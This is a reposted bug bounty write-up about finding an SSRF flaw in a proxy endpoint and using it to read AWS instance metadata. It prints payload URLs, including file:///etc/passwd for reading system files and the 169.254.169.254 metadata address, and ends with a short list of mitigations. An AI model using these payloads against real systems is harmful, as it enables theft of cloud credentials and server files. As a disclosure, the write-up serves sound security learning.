# :globe_with_meridians: SSRF leads to access AWS metadata.

> **Original Source:** [SSRF leads to access AWS metadata.](https://infosecwriteups.com/ssrf-leads-to-access-aws-metadata-21952c220aeb)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# SSRF leads to access AWS metadata.


Hi **Mates**, I am Akash Patil (@skypatil98) from India. I am in the bug bounty field from the last 2.5 years. My previous blog is all about the [IDOR leads to Changing the password of all users (ATO)](https://skypatil.medium.com/idor-leads-to-change-the-password-of-all-users-ato-b598f610a009) which I found on a Private Program. If you haven’t read that blog you can read it by following this [link.](https://skypatil.medium.com/idor-leads-to-change-the-password-of-all-users-ato-b598f610a009) If there are any grammatical mistakes, leave on it. Without wasting any time we will start with the article.


**So let’s get started! 😉**

## What is SSRF?


In the Server-Side Request Forgery (SSRF) attack, the attacker can induce functionality on the server to read or update internal resources. The attacker may be able to read server configuration such as AWS metadata, connect to internal services like http-enabled databases or perform post requests towards internal services which are not intended to be exposed. Learn more about [SSRF](https://portswigger.net/web-security/ssrf).

>

*Let’s consider the target as *`*reducted.com*`* because I can’t disclose the program name.*


After that I checked every request on burp http history and So I use Burp Search to find the possible parameters like,


```
url={target}
file={target}
filename={target}
[top 25 params](https://github.com/lutfumertceylan/top25-parameter/blob/master/ssrf-parameters.txt)
```


And found a **url=** that looks like this.


`*reducted.com/gadgets/proxy/?url=*`

## 1) Tried for open redirect


The URL was like [https://reducted.com/gadgets/proxy/?url=https://evil.com](https://reducted.com/gadgets/proxy?url=%3Furl%3Dhttps%3A%2F%2Fevil.com)


but failed :( It’s throwing an error


## 2) Tried for XSS


The URL was like


https://reducted.com[/gadgets/proxy](https://reducted.com/gadgets/proxy?url=%3Furl%3Dhttps%3A%2F%2Fevil.com)/?url=javascript:alert(1);


[https://reducted.com](https://reducted.com/viewimage/?url=http%3A%2F%2F14.rs)[/gadgets/proxy](https://reducted.com/gadgets/proxy?url=%3Furl%3Dhttps%3A%2F%2Fevil.com)/[?url=http://14.rs](https://reducted.com/viewimage/?url=http%3A%2F%2F14.rs)


[https://reducted.com](https://reducted.com/viewimage/?url=http%3A%2F%2Fbrutelogic.com.br%2Fpoc.svg)[/gadgets/proxy](https://reducted.com/gadgets/proxy?url=%3Furl%3Dhttps%3A%2F%2Fevil.com)[?url=http://brutelogic.com.br/poc.svg](https://reducted.com/viewimage/?url=http%3A%2F%2Fbrutelogic.com.br%2Fpoc.svg)


## Get Akash Rajendra Patil’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


but failed :(


*It’s throwing an error Method Not Allowed*

## 3) Tried for LFI


URL was like [https://reducted.com/gadgets/proxy/?url=file:///etc/passwd](https://reducted.com/viewimage/?url=file%3A%2F%2F%2Fetc%2Fpasswd)


*but failed **:( **error url schema is only HTTP or HTTPS.*


I tried URL schemas to read internal and make the server perform that actions [`file:///`, `dict://`, `ftp://`, `gopher://`] but **:( Failed!So I Visited the URL but it was not loading the content a simple text file gets reflected and downloaded it was having nothing in it.**


After doing lots of other things I didn't get any result so I remember about the magic IP of AWS just for hit and try I replaced the URL parameter with the below IP which is the Magic IP used by the AWS.


Craft the URL like this:


```
[https://reducted.com/gadgets/proxy/?url=](https://reducted.com/viewimage/?url=file%3A%2F%2F%2Fetc%2Fpasswd)[http://169.254.169.254/latest/meta-data](http://169.254.169.254/latest/meta-data)
```


This downloaded a `reducted.txt` file and open it showed below information


*AWS Metadata*

## Mitigation:


- Whitelists and DNS Resolution

- Input Validation

- Response Handling

- Disable Unused URL Schemas

- Authentication on Internal Services


After seeing the bounty amount I was like..**😭😭😭😭😭References:**


Thanks for reading. If you have any question you can DM me on [Twitter](https://twitter.com/skypatil98) 😊

---

*Originally published on [Medium](https://infosecwriteups.com/ssrf-leads-to-access-aws-metadata-21952c220aeb). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
